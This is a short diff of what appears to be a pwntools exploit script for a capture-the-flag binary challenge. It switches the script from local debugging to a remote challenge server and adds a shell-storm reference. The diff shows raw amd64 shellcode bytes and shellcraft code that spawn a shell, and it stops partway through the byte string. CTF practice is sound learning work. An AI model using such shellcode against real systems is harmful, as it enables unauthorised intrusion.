@@ -2,8 +2,8 @@ from pwn import *
 
 BINARY = ['./chall']
 IP, PORT = 'ctf99.cs.ui.ac.id', 10012
-LOCAL = True
-DEBUG = True
+LOCAL = False
+DEBUG = False
 if LOCAL:
     if DEBUG:
         p = gdb.debug(BINARY, '''
@@ -18,6 +18,7 @@ else:
 context.update(arch='amd64', os='linux', endian='little')
 pwn_shellcode = asm(shellcraft.amd64.linux.sh())
 
+# https://shell-storm.org/shellcode/files/shellcode-806.html
 shellcode = b"\x31\xc0\x48\xbb" \
             b"\xd1\x9d\x96\x91" \
             b"\xd0\x8c\x97\xff" \
